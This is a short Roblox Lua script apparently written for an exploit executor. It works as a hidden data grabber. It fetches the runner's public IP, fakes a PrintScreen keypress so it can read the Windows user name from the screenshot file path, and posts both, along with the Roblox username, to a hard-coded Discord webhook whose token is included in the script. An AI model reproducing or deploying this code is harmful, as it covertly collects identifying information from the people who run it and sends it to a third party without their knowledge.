local TestService = game:GetService("TestService") --I like the blue print
local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
local name

game["ScreenshotReady"]:Connect(function(path)
	name = ("Windows Name: "..path:split("\\")[3])
end)

repeat task.wait() until iswindowactive()

keypress(0x2C)
game:FindService("RunService").Heartbeat:Wait()
keyrelease(0x2C)


--// So doesn't re-execute from different script
if name == nil then repeat wait() until name end

local response = syn.request(
	{
		Url = 'https://discord.com/api/webhooks/916859967678607400/E6c4l0SmwMdvvV2t6oFJ9EwhpkXZPT61xORWnAzbByRpQbr3WWuc5NhdUtXYxPNCpiND',
		Method = 'POST',
		Headers = {
			['Content-Type'] = 'application/json'
		},
		Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. name .. " ".. XD .."```"})
		}
	);
